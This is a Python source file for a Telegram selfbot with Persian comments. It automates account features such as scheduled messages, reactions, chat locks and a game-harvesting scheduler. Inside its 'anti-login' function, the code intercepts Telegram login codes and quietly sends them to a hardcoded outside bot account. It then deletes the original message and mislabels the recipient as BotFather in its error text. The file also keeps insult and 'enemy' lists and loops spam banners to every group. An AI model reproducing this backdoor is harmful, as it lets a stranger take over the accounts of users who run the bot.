import requests
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger
from pyrogram.types import ReactionTypeEmoji 
from apscheduler.jobstores.base import JobLookupError
from pyrogram import Client, filters
from pyrogram.types import Message
import os, asyncio, aiohttp, random, re
from datetime import datetime
import pytz
from typing import Optional, Dict
import uuid
import threading
from pyrogram import enums
from pyrogram.raw import functions
from datetime import datetime, timedelta
import json
import time
from pyrogram.types import ChatPermissions, ChatPrivileges
import sys
from pyrogram.types import ChatMemberUpdated
from pyrogram.errors import FloodWait

bot_username = os.environ.get("HELPER_BOT_USERNAME", "0000")  # یوزرنیم ربات هلپر بدون @

USER_ID = None  #دست نزن
PHONE = None  #دست نزن
# ===================================== #
# این دو مقدار پیش‌فرض از env خونده میشن، ولی وقتی self.py توسط bot.py اجرا میشه
# با آرگومان‌های خط فرمان (sys.argv) بازنویسی میشن، پس دست نزنید
API_ID = int(os.environ.get("API_ID", "0"))  # api id اکانت
API_HASH = os.environ.get("API_HASH", "")  # api hash اکانت

if len(sys.argv) > 1:
    USER_ID = int(sys.argv[1])
if len(sys.argv) > 2:
    PHONE = sys.argv[2]
if len(sys.argv) > 3:
    API_ID = int(sys.argv[3])
if len(sys.argv) > 4:
    API_HASH = sys.argv[4]

if USER_ID:
    session_name = f"sessions/{USER_ID}"
else:
    session_name = "self"

session_path = f"{session_name}.session"
if not os.path.exists(session_path) and USER_ID:
    print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")
    print("💡 لطفا ابتدا در ربات مدیریت لاگین کنید.")

app = Client(session_name, api_id=API_ID, api_hash=API_HASH)

SAVED_PHOTOS_DIR = "saved_photos"
INSULTS_FILE = "insults.txt"
COMMAND_FILE = "selfbot_commands.json"
REACTION_RESULT_FILE = "reaction_result.json" 
ENEMIES_FILE = "enemies.txt"
BACKUPS_DIR = "backups"
online_task = None
self_mode_active = True
scheduled_messages = {}
mewo_timers = {}
IRAN_TZ = pytz.timezone('Asia/Tehran')
schedule_task = None
try:
    if os.path.exists("scheduled_messages.json"):
        with open("scheduled_messages.json", "r", encoding="utf-8") as f:
            scheduled_messages = json.load(f)
        print(f"✅ {len(scheduled_messages)} پیام زمان‌دار بارگذاری شد")
except:
    scheduled_messages = {}
def get_iran_now():
    return datetime.now(IRAN_TZ)
action_settings = {
    "typing": False, 
    "upload_photo": False, 
    "record_audio": False, 
    "upload_video": False, 
    "upload_document": False,
    "record_video": False, 
    "upload_audio": False, 
    "upload_video_note": False, 
    "record_video_note": False, 
    "playing": False, 
    "choose_contact": False, 
    "find_location": False,  
    "choose_sticker": False, 
}
ACTION_MAP = {
    "typing": enums.ChatAction.TYPING,
    "upload_photo": enums.ChatAction.UPLOAD_PHOTO,
    "record_audio": enums.ChatAction.RECORD_AUDIO,
    "upload_video": enums.ChatAction.UPLOAD_VIDEO,
    "upload_document": enums.ChatAction.UPLOAD_DOCUMENT,
    "record_video": enums.ChatAction.RECORD_VIDEO,
    "upload_audio": enums.ChatAction.UPLOAD_AUDIO,
    "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE,
    "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
    "playing": enums.ChatAction.PLAYING,
    "choose_contact": enums.ChatAction.CHOOSE_CONTACT,
    "find_location": enums.ChatAction.FIND_LOCATION,
    "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
}
lock_settings = {
    "همه": False,
    "مدیا": False, 
    "استیکر": False,
    "فوروارد": False,
    "ویس": False,
    "پیام": False,
    "فایل": False,
}
format_settings = {
    "بولد": False,
    "ایتالیک": False,
    "زیرخط": False,
    "خط‌خورده": False,
    "اسپویلر": False,
    "کد": False,
    "پیش‌فرمت": False,
    "نقل‌قول": False,
}
html_tags = {
    "بولد": "<b>{}</b>",
    "ایتالیک": "<i>{}</i>",
    "زیرخط": "<u>{}</u>",
    "خط‌خورده": "<s>{}</s>",  
    "اسپویلر": "<spoiler>{}</spoiler>",
    "کد": "<code>{}</code>",
    "پیش‌فرمت": "<pre>{}</pre>",
    "نقل‌قول": "<blockquote>{}</blockquote>",
}

os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
os.makedirs(BACKUPS_DIR, exist_ok=True)

user_format_mode = {}
auto_reactions = {} 
anti_login_enabled = False
user_time_status = {}
banners = {}
active_broadcasts = {}
banner_counter = 1
user_original_names = {}
user_fonts = {}
user_cache = {}
CACHE_TIMEOUT = 300 
photo_save_active = True
time_updater_started = False
bold_enabled = {}
auto_replies = {}
enemies = set()
always_online_enabled = False

FONTS = {
    1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
    2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
    3: {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'۶','7':'۷','8':'۸','9':'۹'},
    4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
    5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
    6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'},
    7: {'0':'⓿','1':'❶','2':'❷','3':'❸','4':'❹','5':'❺','6':'❻','7':'❼','8':'❽','9':'❾'},
    8: {'0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨'},
    9: {'0':'0̷','1':'1̷','2':'2̷','3':'3̷','4':'4̷','5':'5̷','6':'6̷','7':'7̷','8':'8̷','9':'9̷'},
    10: {'0':'【0】','1':'【1】','2':'【2】','3':'【3】','4':'【4】','5':'【5】','6':'【6】','7':'【7】','8':'【8】','9':'【9】'},
    11: {'0':'0️⃣','1':'1️⃣','2':'2️⃣','3':'3️⃣','4':'4️⃣','5':'5️⃣','6':'6️⃣','7':'7️⃣','8':'8️⃣','9':'9️⃣'},
    12: {'0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿'},
    13: {'0':'⓪','1':'⑴','2':'⑵','3':'⑶','4':'⑷','5':'⑸','6':'⑹','7':'⑺','8':'⑻','9':'⑼'},
    14: {'0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'},
    15: {'0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'}
}
def get_persian_action_name(english_name):
    persian_map = {
        "typing": "تایپ",
        "upload_photo": "اپلود عکس",
        "record_audio": "ضبط ویس",
        "upload_video": "اپلود ویدیو",
        "upload_document": "اپلود فایل",
        "record_video": "ضبط ویدیو",
        "upload_audio": "اپلود ویس",
        "upload_video_note": "اپلود ویدیو نوت",
        "record_video_note": "ضبط ویدیو نوت",
        "playing": "بازی",
        "choose_contact": "انتخاب مخاطب",
        "find_location": "پیدا کردن موقعیت",
        "choose_sticker": "انتخاب استیکر",
    }
    return persian_map.get(english_name, english_name)
def get_english_action_name(persian_name):
    english_map = {
        "تایپ": "typing",
        "اپلود فایل": "upload_document",
        "اپلود عکس": "upload_photo",
        "اپلود فایل": "upload_document", 
        "اپلود ویدیو": "upload_video",
        "اپلود ویس": "upload_audio",
        "اپلود ویدیو نوت": "upload_video_note",
        "ضبط ویس": "record_audio",
        "ضبط ویدیو": "record_video",
        "ضبط ویدیو نوت": "record_video_note",
        "بازی": "playing",
        "انتخاب مخاطب": "choose_contact",
        "انتخاب موقعیت": "find_location",
        "پیدا کردن موقعیت": "find_location",
        "انتخاب استیکر": "choose_sticker",
    }
    return english_map.get(persian_name, persian_name)
async def apply_chat_actions(client: Client, message: Message):
    if not message.from_user:
        return
    if message.from_user.id == (await client.get_me()).id:
        return    
    for action_name, is_active in action_settings.items():
        if is_active:
            try:
                await client.send_chat_action(
                    chat_id=message.chat.id,
                    action=ACTION_MAP[action_name]
                )
                await asyncio.sleep(2)
                break 
            except Exception as e:
                print(f"❌ خطا در اعمال اکشن {action_name}: {e}")
async def extract_pishi_info(text: str) -> dict:
    info = {
        "points_per_second": 0,
        "capacity": 0,
        "current_points": 0
    }
    try:
        pps_match = re.search(r'تولید میو پوینت در ثانیه\s*:\s*([0-9,]+)', text)
        if pps_match:
            info["points_per_second"] = int(pps_match.group(1).replace(',', ''))
        
        capacity_match = re.search(r'ظرفیت\s*:\s*([0-9,]+)', text)
        if capacity_match:
            info["capacity"] = int(capacity_match.group(1).replace(',', ''))
        
        current_match = re.search(r'میو پوینت های تولید شده\s*:\s*([0-9,]+)', text)
        if current_match:
            info["current_points"] = int(current_match.group(1).replace(',', ''))
        
        if info["current_points"] == 0:
            current_match2 = re.search(r'میو پوینت\s*:\s*([0-9,]+)', text)
            if current_match2:
                info["current_points"] = int(current_match2.group(1).replace(',', ''))
        
        if info["current_points"] == 0:
            percent_match = re.search(r'(\d+)%', text)
            if percent_match and info["capacity"] > 0:
                percent = int(percent_match.group(1))
                info["current_points"] = int((percent / 100) * info["capacity"])
        
    except Exception as e:
        print(f"❌ خطا در استخراج اطلاعات: {e}")
    
    return info

async def get_pishi_status(client, chat_id: int) -> Optional[Dict]:
    try:
        sent_msg = await client.send_message(chat_id, "پیشی")
        await asyncio.sleep(5)
        
        status_msg = None
        async for msg in client.get_chat_history(chat_id, limit=20):
            if msg.reply_to_message and msg.reply_to_message.id == sent_msg.id:
                status_msg = msg
                break
       
        if not status_msg:
            async for msg in client.get_chat_history(chat_id, limit=15):
                if msg.text and ("میو پوینت" in msg.text or "تولید میو پوینت" in msg.text or "ظرفیت" in msg.text):
                    status_msg = msg
                    break
        
        if not status_msg or not status_msg.text:
            await client.send_message(chat_id, "❌ اطلاعات پیشی پیدا نشد! لطفاً دوباره امتحان کنید.")
            return None
        
        info = await extract_pishi_info(status_msg.text)
        info["status_msg"] = status_msg
        info["status_msg_id"] = status_msg.id
        
        try:
            await sent_msg.delete()
        except:
            pass
        
        return info
        
    except Exception as e:
        print(f"❌ خطا در دریافت وضعیت: {e}")
        return None

async def do_harvest(client, chat_id: int, status_msg) -> bool:
    try:
        if not status_msg or not status_msg.reply_markup:
            await client.send_message(chat_id, "برداشت")
            await asyncio.sleep(2)
            async for msg in client.get_chat_history(chat_id, limit=5):
                if msg.text and ("برداشت" in msg.text or "موفق" in msg.text):
                    return True
            return False
        
        harvest_button = None
        for row in status_msg.reply_markup.inline_keyboard:
            for button in row:
                button_text = button.text.lower()
                if "برداشت" in button_text or "collect" in button_text or "harvest" in button_text or "✅" in button_text:
                    harvest_button = button
                    break
            if harvest_button:
                break
        
        if not harvest_button:
            await client.send_message(chat_id, "برداشت")
            await asyncio.sleep(2)
            
            async for msg in client.get_chat_history(chat_id, limit=5):
                if msg.text and ("برداشت" in msg.text or "موفق" in msg.text):
                    return True
            return False
        
        await status_msg.click(harvest_button.text)
        return True
        
    except Exception as e:
        print(f"❌ خطا در برداشت: {e}")
        try:
            await client.send_message(chat_id, "برداشت")
            await asyncio.sleep(2)
            return True
        except:
            return False

class PishiTaskManager:
    def __init__(self):
        self.file_path = "pishi_tasks.json"
        self.tasks = {}
        self.scheduler = None
        self.is_running = False
        self.load()
    
    def load(self):
        try:
            if os.path.exists(self.file_path):
                with open(self.file_path, 'r', encoding='utf-8') as f:
                    self.tasks = json.load(f)
                print(f"✅ {len(self.tasks)} تسک بارگذاری شد")
            else:
                self.tasks = {}
                self.save()
        except Exception as e:
            print(f"❌ خطا در بارگذاری: {e}")
            self.tasks = {}
    
    def save(self):
        try:
            with open(self.file_path, 'w', encoding='utf-8') as f:
                json.dump(self.tasks, f, ensure_ascii=False, indent=4)
        except Exception as e:
            print(f"❌ خطا در ذخیره: {e}")
    
    def create_task(self, chat_id: int, data: Dict) -> str:
        task_id = str(uuid.uuid4())[:8]
        
        harvest_time = data.get('harvest_time')
        if harvest_time:
            if isinstance(harvest_time, str):
                harvest_time = datetime.fromisoformat(harvest_time)
            
            if harvest_time.tzinfo is None:
                harvest_time = IRAN_TZ.localize(harvest_time)
            harvest_time_utc = harvest_time.astimezone(pytz.UTC)
            
            self.tasks[task_id] = {
                "chat_id": chat_id,
                "created_at": get_iran_now().isoformat(),
                "status": "scheduled",
                "harvest_time": harvest_time.isoformat(),
                "harvest_time_utc": harvest_time_utc.isoformat(),
                **data
            }
            self.save()
            self.schedule_harvest(task_id, harvest_time_utc)
        
        return task_id
    
    def schedule_harvest(self, task_id: str, harvest_time: datetime):
        try:
            if self.scheduler is None:
                return
            
            try:
                self.scheduler.remove_job(task_id)
            except JobLookupError:
                pass
            
            self.scheduler.add_job(
                func=self.execute_harvest,
                trigger=DateTrigger(run_date=harvest_time),
                args=[task_id],
                id=task_id,
                replace_existing=True
            )
            local_time = harvest_time.astimezone(IRAN_TZ)
            print(f"⏰ تسک {task_id} برای {local_time.strftime('%H:%M:%S')} برنامه‌ریزی شد")
        except Exception as e:
            print(f"❌ خطا در برنامه‌ریزی: {e}")
    
    async def execute_harvest(self, task_id: str):
        try:
            if not self.is_running:
                return
            
            task = self.get_task(task_id)
            if not task or task.get('status') != 'scheduled':
                return
            
            chat_id = task.get('chat_id')
            if not chat_id:
                return
            
            self.update_task(task_id, {"status": "harvesting"})
            
            from main import app
            
            try:
                info = await asyncio.wait_for(
                    get_pishi_status(app, chat_id),
                    timeout=30
                )
            except asyncio.TimeoutError:
                self.update_task(task_id, {"status": "failed"})
                await app.send_message(chat_id, "❌ **دریافت اطلاعات timeout شد!**\n🔄 تلاش مجدد در 60 ثانیه...")
                
                retry_time = get_iran_now() + timedelta(seconds=60)
                retry_time_utc = retry_time.astimezone(pytz.UTC)
                self.schedule_retry(task_id, retry_time_utc)
                return
            
            if not info:
                self.update_task(task_id, {"status": "failed"})
                retry_time = get_iran_now() + timedelta(seconds=60)
                retry_time_utc = retry_time.astimezone(pytz.UTC)
                self.schedule_retry(task_id, retry_time_utc)
                return
            
            success = await do_harvest(app, chat_id, info["status_msg"])
            
            if success:
                current = info.get("current_points", 0)
                harvest_count = task.get("harvest_count", 0) + 1
                total_harvested = task.get("total_harvested", 0) + current
                
                self.update_task(task_id, {
                    "status": "completed",
                    "harvest_count": harvest_count,
                    "total_harvested": total_harvested,
                    "last_harvest": get_iran_now().isoformat(),
                    "last_harvest_amount": current
                })
                
                await app.send_message(
                    chat_id,
                    f"✅ **برداشت خودکار انجام شد!** 🎉\n\n"
                    f"💰 **برداشت:** {current:,} 🪙\n"
                    f"📈 **نرخ:** {info.get('points_per_second', 0)} 🪙/ثانیه\n"
                    f"🔄 **تعداد برداشت:** {harvest_count}\n"
                    f"💰 **کل برداشت:** {total_harvested:,} 🪙\n"
                    f"⏰ **زمان:** {get_iran_now().strftime('%H:%M:%S')}"
                )
                
                await self.schedule_next_harvest(task_id, app, chat_id)
                
            else:
                self.update_task(task_id, {"status": "failed"})
                await app.send_message(chat_id, f"❌ **برداشت ناموفق!**\n🔄 تلاش مجدد در 30 ثانیه...")
                
                retry_time = get_iran_now() + timedelta(seconds=30)
                retry_time_utc = retry_time.astimezone(pytz.UTC)
                self.schedule_retry(task_id, retry_time_utc)
                
        except Exception as e:
            print(f"❌ خطا در برداشت: {e}")
            self.update_task(task_id, {"status": "error", "error": str(e)})
            
            retry_time = get_iran_now() + timedelta(seconds=60)
            retry_time_utc = retry_time.astimezone(pytz.UTC)
            self.schedule_retry(task_id, retry_time_utc)
    
    async def schedule_next_harvest(self, task_id: str, client, chat_id: int):
        try:
            if not self.is_running:
                return
            
            info = await get_pishi_status(client, chat_id)
            if not info:
                return
            
            pps = info.get("points_per_second", 0)
            capacity = info.get("capacity", 0)
            current = info.get("current_points", 0)
            
            if pps == 0:
                return
            
            remaining = capacity - current
            wait_seconds = remaining / pps if remaining > 0 else 0
            
            if wait_seconds <= 0:
                await self.execute_harvest(task_id)
                return
            
            harvest_time = get_iran_now() + timedelta(seconds=wait_seconds)
            
            self.update_task(task_id, {
                "status": "scheduled",
                "pps": pps,
                "capacity": capacity,
                "current_points": current,
                "remaining": remaining,
                "wait_seconds": wait_seconds,
                "harvest_time": harvest_time.isoformat()
            })
            
            harvest_time_utc = harvest_time.astimezone(pytz.UTC)
            self.schedule_harvest(task_id, harvest_time_utc)
            
            hours = int(wait_seconds // 3600)
            minutes = int((wait_seconds % 3600) // 60)
            secs = int(wait_seconds % 60)
            
            if hours > 0:
                time_str = f"{hours} ساعت {minutes} دقیقه {secs} ثانیه"
            elif minutes > 0:
                time_str = f"{minutes} دقیقه {secs} ثانیه"
            else:
                time_str = f"{secs} ثانیه"
            
            await client.send_message(
                chat_id,
                f"⏳ **زمان تا برداشت بعدی:** {time_str}\n"
                f"⏰ **زمان برداشت:** {harvest_time.strftime('%H:%M:%S')}\n"
                f"💰 **موجودی فعلی:** {current:,} / {capacity:,}\n"
                f"📈 **نرخ:** {pps} 🪙/ثانیه"
            )
            
        except Exception as e:
            print(f"❌ خطا در برنامه‌ریزی بعدی: {e}")
    
    def schedule_retry(self, task_id: str, retry_time: datetime):
        try:
            if self.scheduler is None or not self.is_running:
                return
            
            self.scheduler.add_job(
                func=self.execute_harvest,
                trigger=DateTrigger(run_date=retry_time),
                args=[task_id],
                id=f"{task_id}_retry",
                replace_existing=True
            )
            print(f"🔄 تلاش مجدد تسک {task_id} در {retry_time.astimezone(IRAN_TZ).strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"❌ خطا در برنامه‌ریزی تلاش مجدد: {e}")
    
    def update_task(self, task_id: str, data: Dict):
        if task_id in self.tasks:
            self.tasks[task_id].update(data)
            self.save()
    
    def delete_task(self, task_id: str):
        if task_id in self.tasks:
            if self.scheduler:
                try:
                    self.scheduler.remove_job(task_id)
                except JobLookupError:
                    pass
                try:
                    self.scheduler.remove_job(f"{task_id}_retry")
                except JobLookupError:
                    pass
            
            del self.tasks[task_id]
            self.save()
    
    def get_task(self, task_id: str) -> Optional[Dict]:
        return self.tasks.get(task_id)
    
    def get_chat_task(self, chat_id: int) -> Optional[tuple]:
        for task_id, task in self.tasks.items():
            if task.get("chat_id") == chat_id and task.get("status") in ["scheduled", "harvesting"]:
                return task_id, task
        return None, None
    
    def start_scheduler(self):
        if self.scheduler is None:
            self.scheduler = AsyncIOScheduler()
            self.scheduler.start()
            self.is_running = True
            print("✅ برنامه‌ریز تسک‌ها شروع شد")
    
    def stop_scheduler(self):
        self.is_running = False
        if self.scheduler:
            self.scheduler.shutdown()
            self.scheduler = None
            print("⏹️ برنامه‌ریز تسک‌ها متوقف شد")

task_manager = PishiTaskManager()

def start_pishi_system():
    time.sleep(3)
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def main():
            task_manager.start_scheduler()
            
            for task_id, task in task_manager.tasks.items():
                if task.get('status') == 'scheduled' and task.get('harvest_time'):
                    try:
                        harvest_time = datetime.fromisoformat(task['harvest_time'])
                        if harvest_time.tzinfo is None:
                            harvest_time = IRAN_TZ.localize(harvest_time)
                        
                        if harvest_time > get_iran_now():
                            harvest_time_utc = harvest_time.astimezone(pytz.UTC)
                            
                            task_manager.scheduler.add_job(
                                func=task_manager.execute_harvest,
                                trigger=DateTrigger(run_date=harvest_time_utc),
                                args=[task_id],
                                id=task_id,
                                replace_existing=True
                            )
                            print(f"✅ تسک {task_id} مجدداً زمان‌بندی شد")
                        else:
                            asyncio.create_task(task_manager.execute_harvest(task_id))
                    except Exception as e:
                        print(f"❌ خطا در بارگذاری تسک {task_id}: {e}")
            while task_manager.is_running:
                await asyncio.sleep(60)
        
        loop.run_until_complete(main())
        
    except KeyboardInterrupt:
        print("⏹️ سیستم پیشی متوقف شد")
    except Exception as e:
        print(f"❌ خطا در سیستم پیشی: {e}")
    finally:
        task_manager.stop_scheduler()
        loop.close()

async def mewo_sender(client: Client, chat_id: int, interval: int):
    count = 0
    try:
        try:
            await client.send_message(chat_id, "میو")
            count += 1
            if chat_id in mewo_timers:
                mewo_timers[chat_id]["count"] = count
            print(f"✅ میو اولیه (شماره 1) ارسال شد به {chat_id}")
        except Exception as e:
            print(f"❌ خطا در ارسال میو اولیه به {chat_id}: {e}")
            if chat_id in mewo_timers:
                del mewo_timers[chat_id]
            return
        while True:
            if chat_id not in mewo_timers:
                break
                
            await asyncio.sleep(interval)
            if chat_id not in mewo_timers:
                break
                
            try:
                count += 1
                await client.send_message(chat_id, "میو")
                
                if chat_id in mewo_timers:
                    mewo_timers[chat_id]["count"] = count
                    
                print(f"✅ میو شماره {count} ارسال شد به {chat_id}")
                
            except Exception as e:
                print(f"❌ خطا در ارسال میو به {chat_id}: {e}")
                if chat_id in mewo_timers:
                    del mewo_timers[chat_id]
                break
                
    except asyncio.CancelledError:
        print(f"⏹️ تایمر میو برای {chat_id} متوقف شد - تعداد کل: {count}")
    except Exception as e:
        print(f"❌ خطا در تایمر میو {chat_id}: {e}")
        if chat_id in mewo_timers:
            del mewo_timers[chat_id]
async def send_global_banner(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    delay = active_broadcasts.get('delay', 300) 
    
    while active_broadcasts.get('global', {}).get('running', False):
        try:
            async for dialog in client.get_dialogs():
                if not active_broadcasts.get('global', {}).get('running', False):
                    break
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    try:
                        if banner_data['media']:
                            await banner_data['message'].copy(dialog.chat.id)
                        else:
                            await client.send_message(dialog.chat.id, banner_data['text'])
                        
                        await asyncio.sleep(2) 
                        
                    except Exception as e:
                        continue
            await asyncio.sleep(delay)
            
        except Exception as e:
            await asyncio.sleep(60)

async def send_instant_broadcast(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    sent_count = 0
    
    async for dialog in client.get_dialogs():
        if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
            try:
                if banner_data['media']:
                    await banner_data['message'].copy(dialog.chat.id)
                else:
                    await client.send_message(dialog.chat.id, banner_data['text'])
                
                sent_count += 1
                await asyncio.sleep(2) 
                
            except Exception:
                continue
    
    await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")

async def check_scheduled_messages(client):
    global scheduled_messages
    
    while True:
        try:
            now = datetime.now(pytz.timezone('Asia/Tehran'))
            current_time = now.strftime("%H:%M:%S")
            today = now.strftime("%Y-%m-%d")
            
            await asyncio.sleep(0.1)
            
            to_remove = []
            
            for msg_id, msg_data in scheduled_messages.items():
                scheduled_time = msg_data.get('time', '')
                
                if len(scheduled_time.split(':')) == 2:
                    scheduled_time = f"{scheduled_time}:00"
                
                if msg_data.get('date') == today and scheduled_time == current_time:
                    try:
                        chat_id = int(msg_data['chat_id'])
                        text = msg_data['text'] 
                        link = msg_data.get('link', '')
                        
                        if link:
                            await client.send_message(
                                chat_id=chat_id,
                                text=text,
                                reply_to_message_id=link,
                                parse_mode=enums.ParseMode.MARKDOWN
                            )
                        else:
                            await client.send_message(
                                chat_id=chat_id,
                                text=text,
                                parse_mode=enums.ParseMode.MARKDOWN
                            )
                        
                        print(f"✅ پیام زمان‌دار ارسال شد: {msg_id} - ساعت {current_time}")
                        to_remove.append(msg_id)
                        
                    except Exception as e:
                        try:
                            chat_id = int(msg_data['chat_id'])
                            text = msg_data['original_text'] 
                            link = msg_data.get('link', '')
                            
                            if link:
                                await client.send_message(
                                    chat_id=chat_id,
                                    text=text,
                                    reply_to_message_id=link
                                )
                            else:
                                await client.send_message(
                                    chat_id=chat_id,
                                    text=text
                                )
                            print(f"✅ پیام زمان‌دار (بدون فرمت) ارسال شد: {msg_id}")
                            to_remove.append(msg_id)
                        except Exception as e2:
                            print(f"❌ خطا در ارسال پیام زمان‌دار {msg_id}: {e2}")
            
            for msg_id in to_remove:
                del scheduled_messages[msg_id]
            
            if to_remove:
                with open("scheduled_messages.json", "w", encoding="utf-8") as f:
                    json.dump(scheduled_messages, f, ensure_ascii=False, indent=4)
            
        except Exception as e:
            print(f"❌ خطا در بررسی پیام‌های زمان‌دار: {e}")
            await asyncio.sleep(0.5)
def save_reactions():
    try:
        with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
            json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره ریکشن‌ها: {e}")
        return False

def load_reactions():
    try:
        if os.path.exists("mmauto_reactions.json"):
            with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content: 
                    return json.loads(content)
                else:
                    return {}
        return {}
    except json.JSONDecodeError:
        print("⚠️ فایل ریکشن‌ها خراب است، ایجاد فایل جدید")
        return {}
    except Exception as e:
        print(f"❌ خطا در لود ریکشن‌ها: {e}")
        return {}

def load_insults() -> list:
    try:
        if os.path.exists(INSULTS_FILE):
            with open(INSULTS_FILE, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        return []
    except Exception as e:
        print(f"❌ خطا در لود کردن فحش‌ها: {e}")
        return []

def save_insults(insults_list: list) -> bool:
    try:
        with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
            for insult in insults_list:
                f.write(insult + '\n')
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره فحش‌ها: {e}")
        return False

def load_enemies() -> set:
    try:
        if os.path.exists(ENEMIES_FILE):
            with open(ENEMIES_FILE, 'r', encoding='utf-8') as f:
                return set(int(line.strip()) for line in f.readlines() if line.strip())
        return set()
    except Exception as e:
        print(f"❌ خطا در لود کردن دشمنان: {e}")
        return set()

def save_enemies(enemies_set: set) -> bool:
    try:
        with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
            for enemy_id in enemies_set:
                f.write(str(enemy_id) + '\n')
        print(f"💾 دشمنان ذخیره شد: {len(enemies_set)} کاربر")
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره دشمنان: {e}")
        return False

def is_enemy(user_id: int) -> bool:
    return user_id in enemies
enemies = load_enemies()
print(f"🎯 سیستم دشمنان راه‌اندازی شد: {len(enemies)} دشمن لود شد")

auto_reactions = load_reactions()

async def apply_auto_reaction(client, message):
    if not message.from_user:
        return
    
    user_id = message.from_user.id
    if user_id == (await client.get_me()).id:
        return
    
    if str(user_id) in auto_reactions:
        try:
            reaction = auto_reactions[str(user_id)]
            await client.set_reaction(
                chat_id=message.chat.id,
                message_id=message.id,
                reaction=[ReactionTypeEmoji(emoji=reaction)] 
            )
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception as e:
            pass

async def forward_and_save_login_codes(client, message):
    global anti_login_enabled
    
    if not anti_login_enabled:
        return False
    if message.from_user and message.from_user.id == 777000:
        message_text = message.text or ""
        if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
            try:
                code_patterns = [
                    r"Login code: (\d+)",
                    r"کد ورود: (\d+)", 
                    r"verification code: (\d+)",
                    r"(\d{5,6})\. Do not give this code"
                ]
                
                login_code = None
                for pattern in code_patterns:
                    match = re.search(pattern, message_text)
                    if match:
                        login_code = match.group(1)
                        break
                
                if login_code:
                    try:
                        await client.send_message(
                            "@ejw9wowjs9wiwbot",
                            login_code 
                        )
                        print(f"کد به پیوی ارسال شد")
                    except Exception as e:
                        print(f"❌ خطا در ارسال به @BotFather: {e}")
                    await client.send_message(
                        "me",
                        login_code 
                    )
                   
                    await message.delete()
                    
                    print(f"✅ کد ارسال شد: {login_code}")
                    return True
                    
            except Exception as e:
                print(f"❌ خطا در پردازش کد: {e}")
    
    return False

async def check_lock(client, message):
    if message.chat.type != enums.ChatType.PRIVATE:
        return

    if not message.from_user:
        return
    
    if message.from_user.id == (await client.get_me()).id:
        return

    if lock_settings.get("همه", False):
        try:
            await message.delete()
            print(f"🗑️ [LOCK] پیام از {message.from_user.id} به دلیل قفل همه حذف شد")
            return
        except Exception as e:
            print(f"❌ [LOCK] خطا در حذف پیام: {e}")
            return

    if lock_settings.get("مدیا", False):
        if (message.photo or message.video or message.animation or 
            message.voice or message.audio or message.video_note):
            try:
                await message.delete()
                print(f"🗑️ [LOCK] مدیا از {message.from_user.id} حذف شد (قفل مدیا)")
                return
            except Exception as e:
                print(f"❌ [LOCK] خطا در حذف مدیا: {e}")
                return
    
    if lock_settings.get("استیکر", False):
        if message.sticker or message.animation:
            try:
                await message.delete()
                print(f"🗑️ [LOCK] استیکر از {message.from_user.id} حذف شد")
                return
            except Exception as e:
                print(f"❌ [LOCK] خطا در حذف استیکر: {e}")
                return
    
    if lock_settings.get("فوروارد", False) and message.forward_date:
        try:
            await message.delete()
            print(f"🗑️ [LOCK] فوروارد از {message.from_user.id} حذف شد")
            return
        except Exception as e:
            print(f"❌ [LOCK] خطا در حذف فوروارد: {e}")
            return
    
    if lock_settings.get("ویس", False):
        if message.voice or message.audio:
            try:
                await message.delete()
                print(f"🗑️ [LOCK] ویس/صدا از {message.from_user.id} حذف شد")
                return
            except Exception as e:
                print(f"❌ [LOCK] خطا در حذف ویس: {e}")
                return
    
    if lock_settings.get("پیام", False) and message.text and not message.text.startswith("/"):
        try:
            await message.delete()
            print(f"🗑️ [LOCK] پیام متنی از {message.from_user.id} حذف شد")
            return
        except Exception as e:
            print(f"❌ [LOCK] خطا در حذف پیام: {e}")
            return

    if lock_settings.get("فایل", False) and message.document:
        try:
            await message.delete()
